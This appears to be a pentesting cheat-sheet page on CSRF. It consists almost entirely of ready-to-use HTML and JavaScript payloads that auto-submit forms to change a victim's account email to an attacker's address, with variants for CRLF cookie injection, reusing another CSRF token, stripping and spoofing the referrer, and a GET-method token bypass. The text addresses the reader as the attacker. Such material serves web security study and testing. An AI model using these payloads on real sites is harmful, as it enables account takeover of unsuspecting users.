---
title: CSRF (Cross-Site Request Forgery)
description: CSRF is an attacking methodology that forces an end user to execute unexpected actions on a web application.
tags:
    - Web
refs:
date: 2022-12-22
draft: false
---

## POST Request

The payloads need to be entered in the post form like comments, profile in the target web page.  
They force to update the victim account's email address to your email address.

1. **Basic**

    <div data-pagefind-ignore>

    ```html
    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    ```

    </div>

2. **Cookie Injection**

    <div data-pagefind-ignore>

    ```html
    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <img src="https://vulnerable.com/?search=attack%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();">
    ```

    </div>

3. **Use the Other CSRF Token**

    <div data-pagefind-ignore>

    ```html
    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="hidden" name="csrf" value="PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    ```

    </div>

4. **Referrer Validation**

    <div data-pagefind-ignore>

    ```html
    <meta name="referrer" content="no-referrer">

    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
        // For referrer validation....
        history.pushState("", "", "/?vulnerable.com");
        
        document.forms[0].submit();
    </script>
    ```

    </div>

<br />

## GET Request (Bypass CSRF Token)

<div data-pagefind-ignore>

```html
<!-- ex. https://attacker.com/exploit -->

<form method="GET" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

</div>